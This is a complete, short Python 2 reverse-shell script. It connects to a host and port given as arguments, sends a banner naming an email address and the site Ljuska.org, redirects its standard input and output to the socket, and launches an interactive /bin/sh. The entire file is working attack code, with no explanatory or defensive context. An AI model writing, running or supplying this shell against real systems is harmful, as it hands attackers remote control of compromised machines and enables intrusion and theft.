#!/usr/bin/python
import sys, socket, os, subprocess

host = sys.argv[1]
port = int(sys.argv[2])

socket.setdefaulttimeout(60)

def bc():
  try:
    sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sok.connect((host,port))
    sok.send('''
              b4ltazar@gmail.com
                  Ljuska.org \n\n''')
    os.dup2(sok.fileno(),0)
    os.dup2(sok.fileno(),1)
    os.dup2(sok.fileno(),2)
    os.dup2(sok.fileno(),3)
    shell = subprocess.call(["/bin/sh","-i"])
  except socket.timeout:
    print "[!] Connection timed out"
  except socket.error, e:
    print "[!] Error while connecting", e
  
bc()
    
  
